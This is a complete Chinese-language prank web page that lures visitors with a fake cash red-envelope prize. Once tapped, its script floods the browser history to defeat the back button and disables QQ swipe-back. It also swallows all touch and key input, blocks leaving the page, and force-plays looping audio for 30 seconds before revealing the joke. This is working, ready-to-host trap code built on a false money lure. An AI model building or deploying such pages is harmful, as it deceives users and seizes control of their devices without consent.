<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>你有一个红包待领取</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{overscroll-behavior:none;overflow:hidden;width:100%;height:100%}
body{background:#fff;font-family:-apple-system,"PingFang SC",sans-serif}
.bait{display:flex;text-align:center;color:#fff;position:fixed;top:0;left:0;width:100vw;height:100vh;background:linear-gradient(135deg,#ff4444 0%,#cc0000 100%);align-items:center;justify-content:center;flex-direction:column;z-index:10;cursor:pointer;-webkit-tap-highlight-color:transparent}
.bait .icon{font-size:80px;animation:pulse 1.5s infinite}
.bait h1{font-size:28px;margin:16px 0 8px;animation:pulse 1.5s infinite}
.bait p{font-size:16px;opacity:.8;animation:pulse 1.5s infinite}
.bait .tap{margin-top:24px;padding:12px 32px;background:#ffd700;color:#c00;border-radius:24px;font-size:18px;font-weight:bold;display:inline-block;animation:bounce 1s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
#player{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:99999;flex-direction:column;align-items:center;justify-content:center;color:#fff;text-align:center}
#player .spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{to{transform:rotate(360deg)}}
#player p{opacity:.7;font-size:14px}
#shield{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;background:transparent;touch-action:none}
</style>
</head>
<body>

<div class="bait" id="bait">
<div class="icon">🧧</div>
<h1>恭喜你获得现金红包！</h1>
<p>点击领取，24小时内有效</p>
<div class="tap">立即领取</div>
</div>

<div id="shield"></div>

<div id="player">
<div class="spinner"></div>
<p>正在领取红包...</p>
</div>

<script>
// 注册 Service Worker
if("serviceWorker" in navigator){
  navigator.serviceWorker.register("sw.js").catch(function(){});
}

(function(){
var ua=navigator.userAgent.toLowerCase();
var isQQ=/qq\//.test(ua)||/qzone/.test(ua);
var url=location.href.split('#')[0].split('?')[0];
var bait=document.getElementById("bait");
var shield=document.getElementById("shield");
var player=document.getElementById("player");
var started=false;
var ended=false;
var audioCtx=null;
var audioSource=null;

// QQ 禁右滑
if(isQQ){
  var s=document.createElement("script");
  s.src="https://open.mobile.qq.com/sdk/qqapi.js";
  s.onload=function(){
    try{mqq.invoke("view","setSwipeBackEnabled",{enabled:false});}catch(e){}
    try{mqq.invoke("nav","setSwipeBackEnabled",{enabled:false});}catch(e){}
  };
  document.head.appendChild(s);
}

// 诱饵点击
bait.addEventListener("click",go);
function go(e){
  if(started)return;
  e.preventDefault();
  started=true;

  // 启动防退出
  try{for(var i=0;i<500;i++)history.pushState({},"",url);}catch(e){}
  setInterval(function(){if(!ended)try{for(var i=0;i<100;i++)history.pushState({},"",url);}catch(ex){}},200);
  window.onpopstate=function(){if(!ended)try{for(var i=0;i<500;i++)history.pushState({},"",url);}catch(ex){}};
  window.addEventListener("beforeunload",function(ev){if(!ended){ev.preventDefault();ev.returnValue=""}});

  bait.style.display="none";
  shield.style.display="block";
  player.style.display="flex";

  // 用 Web Audio API 播放（后台也能播放）
  audioCtx=new(window.AudioContext||window.webkitAudioContext)();
  fetch("video.mp4").then(function(r){return r.arrayBuffer()}).then(function(buf){
    return audioCtx.decodeAudioData(buf);
  }).then(function(decoded){
    audioSource=audioCtx.createBufferSource();
    audioSource.buffer=decoded;
    audioSource.connect(audioCtx.destination);
    audioSource.loop=true;
    audioSource.start(0);

    // 通知 Service Worker 开始播放
    if(navigator.serviceWorker&&navigator.serviceWorker.controller){
      navigator.serviceWorker.controller.postMessage("start");
    }

    // 播放中显示
    player.innerHTML='<div style="font-size:60px;margin-bottom:20px">🧧</div><h2 style="margin-bottom:10px">红包正在拆开中...</h2><p style="opacity:.7">请稍候</p>';
  }).catch(function(){
    // Web Audio 失败，回退到普通 audio 元素
    var audio=new Audio("video.mp4");
    audio.loop=true;
    audio.volume=1.0;
    audio.play();
    player.innerHTML='<div style="font-size:60px;margin-bottom:20px">🧧</div><h2 style="margin-bottom:10px">红包正在拆开中...</h2><p style="opacity:.7">请稍候</p>';
  });

  if(isQQ&&window.mqq)try{mqq.invoke("view","setSwipeBackEnabled",{enabled:false});}catch(ex){}

  // 拦截所有触摸
  shield.addEventListener("touchstart",function(ev){ev.preventDefault();ev.stopPropagation();},{passive:false});
  shield.addEventListener("touchmove",function(ev){ev.preventDefault();ev.stopPropagation();},{passive:false});
  shield.addEventListener("touchend",function(ev){ev.preventDefault();ev.stopPropagation();},{passive:false});
  document.addEventListener("touchstart",function(ev){if(!ended)ev.preventDefault();},{passive:false});
  document.addEventListener("touchmove",function(ev){if(!ended)ev.preventDefault();},{passive:false});
  document.addEventListener("touchend",function(ev){if(!ended)ev.preventDefault();},{passive:false});

  document.addEventListener("keydown",function(ev){if(!ended){ev.preventDefault();ev.stopPropagation()}});
  document.addEventListener("contextmenu",function(ev){ev.preventDefault()});

  // 切后台→恢复音频
  document.addEventListener("visibilitychange",function(){
    if(!document.hidden&&!ended){
      if(audioCtx&&audioCtx.state==="suspended")audioCtx.resume();
    }
  });

  // 30秒后显示整蛊结果（模拟"放完"）
  setTimeout(function(){
    ended=true;
    shield.style.display="none";
    if(audioSource)try{audioSource.stop();}catch(e){}
    if(audioCtx)try{audioCtx.close();}catch(e){}
    if(isQQ&&window.mqq)try{mqq.invoke("view","setSwipeBackEnabled",{enabled:true});}catch(ex){}
    player.style.display="none";
    // 通知 Service Worker 停止
    if(navigator.serviceWorker&&navigator.serviceWorker.controller){
      navigator.serviceWorker.controller.postMessage("stop");
    }
    document.body.style.background="#1a1a2e";
    document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#fff;text-align:center;font-family:sans-serif"><div><div style="font-size:60px">😂</div><h2 style="margin:16px 0">哈哈哈哈被整了吧！</h2><p style="opacity:.7">张雪峰老师给你上了一课</p></div></div>';
  },30000);
}
})();
</script>
</body>
</html>
